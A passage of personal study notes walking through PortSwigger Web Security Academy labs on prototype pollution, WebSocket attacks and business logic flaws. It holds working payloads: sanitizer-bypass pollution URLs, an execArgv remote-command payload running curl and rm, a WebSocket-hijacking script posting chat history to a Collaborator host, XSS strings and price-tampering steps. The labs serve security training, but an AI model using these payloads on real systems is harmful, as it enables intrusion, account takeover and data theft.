                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20594.png)
                
            - we can also display a pop up using the button exploit
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20595.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20596.png)
                
        - Client-side prototype pollution via browser APIs
            - lab link
                
                [https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)
                
            - DOM invader detects 2 sources
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20597.png)
                
            - Next, we scan for gadgets
                
                This means that the gadget is `value`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20598.png)
                
            - so we use the same payload as the previous lab `data:,alert();//` to trigger a pop up
                
                ```html
                https://vulnapp.com/?__proto__[value]=data:,alert();//
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20599.png)
                
            
        - DOM XSS via an alternative prototype pollution vector
            - lab link ( and a different solution that u should check)
                
                [https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
                
            - using DOM Invader, we find a source , we test it
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20600.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20601.png)
                
            - this is different from the source used in the previous lab which doesn’t work here
                - so use the exact source sourc eu got from DOM Invader !
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20602.png)
                
            - Next, we scan for gadgets
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20603.png)
                
                This means that the gadget is **`sequence`**
                
            - to come up with the right payload, we check the source code of the js file containing the sink
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20604.png)
                
                - Notice that the eval won’t get any single quotes, they are only used to concatenate the strings
                - it can be useful to check the console of errors caused by using the wrong payload
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20605.png)
                    
            - by trying not to break the syntax, i forged the payload `);alert();a=(` which worked
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20606.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20607.png)
                
            
        - Client-side prototype pollution via flawed sanitization
            - lab link
                
                [https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
                
            - if we take a look at javascript files loaded by the app, we’ll find that `deparamSanitized.js` uses the `sanitizeKey()` function defined in `searchLoggerFiltered.js` to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20608.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20609.png)
                
            - we also notice that `transport_url` is a potential gadget that we can use when we find a source.
                1. Study the JavaScript files again and notice that `searchLogger.js` dynamically appends a script to the DOM using the `config` object's `transport_url` property if present.
                2. Notice that no `transport_url` property is set for the `config` object. This is a potential gadget.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20610.png)
                
            - Dom invader didn’t work, which makes sense since it uses the classic payloads
            - using one of the classic payloads, we find a prototype pollution source and bypass the website's key sanitization.
                
                ```jsx
                https://0a4c005c032ed38c84db73c300d30061.web-security-academy.net/?__pro__proto__to__[foo]=bar
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20611.png)
                
            - other payloads that may bypass the blacklist (didn’t try them, from the solution)
                
                ```
                /?__pro__proto__to__[foo]=bar
                /?__pro__proto__to__.foo=bar
                /?constconstructorructor.[protoprototypetype][foo]=bar
                /?constconstructorructor.protoprototypetype.foo=bar
                ```
                
            - Dom invader won’t help to get the gadget this time, so we use the gadget that we previously found in `searchLoggerFiltered.js`
            - Using the payload `__pro__proto__to__[transport_url]=data:,alert(1);` we solve the lab
                
                ```jsx
                https://0a59007203fed34984e9872a0004002b.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert();//
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20612.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20613.png)
                
        - Client-side prototype pollution in third-party libraries
            - lab link
                
                [https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
                
            - Using Dom Invader, we identifiy two prototype pollution vectors in the `hash` property
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20614.png)
                
            - we click on the test button or we test this manually
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20615.png)
                
            - Next, we scan for gadgets and we find the gadget `hitCallback`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20616.png)
                
            - Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20617.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20618.png)
                
            - this didn’t for work me on firefow, only burp chromuim’s browser
            - Since the goal is to deliver a payload to the victim that calls `alert(document.cookie)`, i used the following code in the exploit server to solve the lab
                
                ```jsx
                Hello, world!
                
                <script>
                
                function redirectToSpecificPage() {
                  // Replace 'destination.html' with the URL of the specific page you want to redirect to
                  var url = "https://0a3c004b037b075880c2ffc3007600a1.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)";
                
                  // Redirect to the specific page
                  window.location.href = url;
                }
                
                redirectToSpecificPage();
                </script>
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20619.png)
                
            - code from solution (better and shorter)
                
                ```jsx
                <script>
                    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
                </script>
                ```
                
    - Server-side vulnerabilities
        - Privilege escalation via server-side prototype pollution
            - lab link
                
                [https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)
                
            - the feature “Updated Billing and Delivery Address”, we can see the presence that the user object has a property `isAdmin`  which is relevant to our goal
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20620.png)
                
            - using the same post request,  i attempted to to pollute the global `Object.prototype` with an arbitrary property and it worked
                - Don’t forget to add a comma if u want to add another line in the json
                
                ```jsx
                {"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"JIAmvbgnTCBKslGDOeIsBvf5GtNfqXza",
                "__proto__":{
                        "foo":"bar"
                    }
                
                }
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20621.png)
                
            - Notice that the object in the response now includes the arbitrary property that you injected, but no `__proto__` property.
            - This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain.
            - so, i used the prototype pollution to overwrite the value of the `isAdmin` property
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20622.png)
                
            - This suggests that the object doesn't have its own `isAdmin` property, but has instead inherited it from the polluted prototype.
            - using the new admin privileges, i deleted carlos to solve the lab
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20623.png)
                
            
        - Detecting server-side prototype pollution without polluted property reflection
            - lab link
                
                [https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)
                
            - in this lab, if we add an object with an arbitrary property, it won’t be reflected in the response
            - if we break the syntax, we get the following error where the error object contains a `status` property with the value `400`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20624.png)
                
            - Next, we pollute the `status` property with a value between 400 and 599.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20625.png)
                
            - Notice that this time, although you triggered the same error, the `status` and `statusCode` properties in the JSON response changed
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20626.png)
                
            - This strongly suggests that you have successfully polluted the prototype and the lab is solved.
            
        - Bypassing flawed input filters for server-side prototype pollution
            - lab link
                
                [https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)
                
            - i started by lunching the extenions ⇒ server side pollution scanner ⇒ full scan to confirm the requested containing the bug
                
                you should run the extensions  on all endpoints when u don’t know the endpoint
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20627.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20628.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20629.png)
                
            - this gave confusing weird results because there is an input filter ( a blocklist)
            - so we try one of the bypasses we have seen previously in “Client-side prototype pollution via flawed sanitization” which worked
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20630.png)
                
            - if there was no reflection, we could have used on of the 3 techniques like changing error coce (check portswigger solution)
            - Finally, use the prototype pollution to change the valur of `isAdmin`
                
                ```jsx
                "constructor": {
                    "prototype": {
                        "isAdmin":"true"
                    }
                }
                }
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20631.png)
                
            - again, This suggests that the object doesn't have its own `isAdmin` property, but has instead inherited it from the polluted prototype.
        - Remote code execution via server-side prototype pollution
            - lab link ( and good detailed solution)
                
                [https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)
                
            - some non necessary details
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20632.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20633.png)
                
            - using the extension, we confirm the vulnerability
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20634.png)
                
            - unnecessary step, good for debugging
                - after accessing the admin panel, we get a dns probe which means that action creates a new node process
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20635.png)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20636.png)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20637.png)
                    
                - using the payload in the course, we pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20638.png)
                    
            - In the browser, go to the admin panel and observe that there's a button for running maintenance jobs.
            - Click the button and observe that this triggers background tasks that clean up the database and filesystem.
            - This is a classic example of the kind of functionality that may spawn node child processes.
            - Try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process. Use this to call the `execSync()` sink, passing in a command that triggers an interaction with the public Burp Collaborator server.
                
                ```jsx
                "__proto__": {
                    "execArgv":[
                        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
                    ]
                }
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20639.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20640.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20641.png)
                
            - after the pollution, we went back to the admin panel and triggered the maintenance jobs again (to spawn the child process )
            - Finally, we change the system command to delete carlos
                
                ```jsx
                "__proto__": {
                    "execArgv":[
                        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
                    ]
                }
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20642.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20643.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20644.png)
                
- Websockets
    - Manipulating WebSocket messages to exploit vulnerabilities
        - lab link
            
            [https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
            
        - make sure you have the following settings checked (default configuration)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20645.png)
            
        - interception only works when i use burp browser
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20646.png)
            
        - i edited the message to add an xss payload to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20647.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20648.png)
            
        - u need to be fast somehow or the live agent disconnects
    - Manipulating the WebSocket handshake to exploit vulnerabilities
        - lab link (check video solution too)
            
            [https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
            
        - new reminder, use burp browser for apps using websockets
        - it’s better to use a new burp session (re-open burp) for each websocket lab
        - they said that there is an xss filter so i started with `print()` and not `alert()`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20649.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20650.png)
            
        - by using another payload, my IP address has been banned.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20651.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20652.png)
            
        - Don’t delete the websockets history, this will ruin the lab
        - so i added the following header to the handshake request to spoof the IP address:`X-Forwarded-For: 1.1.1.1` in repeater and restarted the connection (check video)
            - we click the pen in repeater, choose the first handshake request, add the header and click reconnect
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20653.png)
                
            - now, we can resend websocket messages
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20654.png)
                
        - you should send the request from websockets history to repeater (and not the normal burp history)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20655.png)
            
        - you may get “invalid upgrade requests” and u can’t click on “reconnect”, so put `X-Forwarded-For: 1.1.1.1` after the host header and not at the end
        - by using the following xss payloads (which doesn’t use parentheses),  we should be able to solve the lab `<img src=1 oNeRrOr=alert`1`>`
            - i tested that payload in firefox and it worked
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20656.png)
            
    - Cross-site WebSocket hijacking ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking))
        - lab link
            
            [https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
            
        - In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20657.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20658.png)
            
        - In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no [CSRF](https://portswigger.net/web-security/csrf) tokens
            - we can see that the only session token transmitted in this request is the session cookie:
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20659.png)
            
        - Using the following code, we perform the CSRF to get the chat history
            
            ```jsx
            <script>
                var ws = new WebSocket('wss://your-websocket-url');
                ws.onopen = function() {
                    ws.send("READY");
                };
                ws.onmessage = function(event) {
                    fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
                };
            </script>
            ```
            
            - in our case, it’s the exact following code
                
                ```jsx
                <script>
                    var ws = new WebSocket('wss://0af7005703027e65815ea88400f30073.web-security-academy.net/chat');
                    ws.onopen = function() {
                        ws.send("READY");
                    };
                    ws.onmessage = function(event) {
                        fetch('https://b9lyxlrr97nnm4bqqw9iocxfe6kx8nwc.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
                    };
                </script>
                ```
                
        - after testing the code on our own session, we deliver the exploit to the victim and get the following http requests in the collobarotor
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20660.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20661.png)
            
        - using the found password, we log in as carlos in order to solve the lab
            
            
        
- Business Logic
    - Excessive trust in client-side controls
        - the goal is to buy a specific expensive product (compared to the money give you)
        - the title gives you a hint about the solution, although i have seen this before in juice shop
        - in the add to cart feature, i changed the price of the product to a lower price
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20662.png)
            
        - the price has indeed changed and we place the order
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20663.png)
            
    - High-level logic vulnerability
        - same goal as the previous lab of buying an expensive product
        - this time there is no parameter controlling the price  but u can use a negative quantity
        - if the price is negative, u can’t checkout
        - so the solution in this case is to add other products with negative quantities ( with lead to negative prices)
        - the final price of buying all those products should be less than 100 (the budget they give us)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20664.png)
            
        - we place the order to solve the lab
        - important mistake to avoid : ***negative amount for jacket***
            - in the first attempt, i tried to have a low final price by using a negative quantity for the jacket, and it didn’t work
            - i didn’t get “congrats …” because a negative quantity for the jacket  logically means u didn’t buy the jacket
        
    - Inconsistent security controls
        - the goal is to access admin panel using a normal user
        - lab link and solution (must see)
            
            [https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20665.png)
            
        - Use automatic directory brute forcing with Burp to find the page `/Admin` (recommended/best solution)
            - Right-click on the lab domain and select "Engagement tools" > "Discover content" to open the content discovery tool.
            - Click "Session is not running" to start the content discovery. After a short while, look at the "Site map" tab in the dialog. Notice that it 
            discovered the path `/admin`
            - check site map tab of Content discovery
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20666.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20667.png)
            
        - if we access `/admin` we get the following message (it was just a guess when i did it)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20668.png)
            
        - so we change the email to become DontWannaCry user and we notice that we can access the admin panel
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20669.png)
            
        - so we delete the user carlos to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20670.png)
            
    - Flawed enforcement of business rules
        - goal is to buy the same expensive jacket as the previous labs
        - full detailed solution
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20671.png)
            
        - u find the first coupon easily in green.
        - there is a second coupon when u scroll to the bottom of the page and enter an email in the newsletter
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20672.png)
            
        - when i saw the discount feature, i directly checked if u can use the coupon many times, and that wasn’t possible.
        - trying turbo intruder’s [race.py](http://race.py) didn’t help and it was clearly not the intended.
        - the clever idea here is that to reuse the coupon many times, we should alternate between the 2 coupons
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20673.png)
            
        - Important notes !
            - scroll the page, check all features, any feature that seem new could be interesting.
            - if there is a protection mechanism, try to play with it, it may not be blocking things all the time.
    - Low-level logic flaw
        - full detailed solution (must read)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20674.png)
            
        - The idea here is that the price should exceed the maximum value permitted for an integer in the back-end programming language (2,147,483,647).
        - As a result, the value will loop back around to the minimum possible value (-2,147,483,648) and starts counting up towards 0.
        - Since u need to maximize the price, u need to keep adding the maximum quantity that u can possible add a time which is 99.
        - So, we’ll be using intruder with this quantity, and in the hint they recommend to only use one max concurrent connection 1 (to move fast)
        - screenshots inside shows that at some point you’ll have a negative value
            
            u can also use null payloads
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20675.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20676.png)
            
        - the goal is to to go around and land between 0 and 100$
        - Note that the price of the jacket is stored in cents (133700). i guess what they meant by this sentence is that the int value stored is this 133700
        - Also note they u need to go from 0 to max possible value that can be stores in an int (2,147,483,647)  then you add one to fall in  -2111 then u need to go back to 0
        - meaning u need to add enough jackets to have twice the price of 2,147,483,647 + one jacket (to aller et retour to 0)
        - meaning to get near to the 0 (from an empty cart) we should 2,147,483,647*2+1*133700= (max possible number*2+1) divided by  (99*133700)=324.48
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20677.png)
            
        - if you don’t use only 1 thread, u may have wrong results, since not all your requests gets accepted !!
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20678.png)
            
        - so we add 323 payload ( then we can add jackets less than 99)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20679.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20680.png)
            
        - we’re left with a total of -$64060.96, if we divided that by the price of jackets 1337  (64060.96/1337=47.91)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20681.png)
            
        - so we add 47 jackets
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20682.png)
            
        - then i kept adding from  another product  till i was between 0 and 100$ ( they can all do the job i guess since they are less than 100 dollars)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20683.png)
            
        
    - Inconsistent handling of exceptional input
        - lab link with detailled solution
            
            [https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
            
        - u can discover the endpoint of  `/admin`  by guessing or by using burp’s directory brute forcing feature (reminder inside of how it works)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20684.png)
            
            then u click “session is not running” to start the session
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20685.png)
            
            Then, new endpoints like /admin should appear in the site map
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20686.png)
            
        - this endpoint shows message indicating that we should be DontWannaCry user to access it
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20687.png)
            
        - in the register part, we understand that  a DontWannaCry user is a user having the email @dontwannacry.com
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20688.png)
            
        - Note the following sentence in /email, we also display subdomains !
            
            **Displaying all emails @exploit-0a58004104a062ebc07b9931011a0037.exploit-server.net and all subdomains**
            
        - i registered an email with 256 characters, after login, i found that the email kept only the first 256 characters
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20689.png)
            
        - so i made an email that has the length of 256 with ‘@dontwannacry.com’ included
            
            ```csharp
            aaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz@dontwannacry.com.exploit-0a58004104a062ebc07b9931011a0037.exploit-server.net
            ```
            
            to do that, use a text editor like sublime and keep checking the number of columns (like done in the video solution of the gerrman guy)
            
        - Then, after registering, and logging in, i was able to access the admin panel and delete carlos
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20690.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20691.png)
            
    - Weak isolation on dual-use endpoint
        - this was an easy one
        - u log in and find a password modification feature
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20692.png)
            
        - change the request to modify administrator’s password
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20693.png)
            
        - log in with the admin’s account, delete carlos to solve the lab
        
    - Insufficient workflow validation
        - in the description of the lab, they say there is flawed assumptions about the sequence of events in the purchasing workflow.
        - i purchased a cheap product and noticed that at the end the following request get sent
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20694.png)
            
        - so i added the jacket to my cart and resent the previous request, order made and lab solved
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20695.png)
            
    - Authentication bypass via flawed state machine
        - took me a while to solve the lab because the description was confusing, this is not login bypass, this is an access control problem
        - solution
            - the login is multi-step process and each step gives u a cookie
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20696.png)
                
            - u take the first cookie u get and use it to get to /admin and delete carlos and voila !!
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20697.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20698.png)
                
        - being able to do administrative things could be done by finding and access admin panel, usually in   /admin and not necessarily by login in as admin
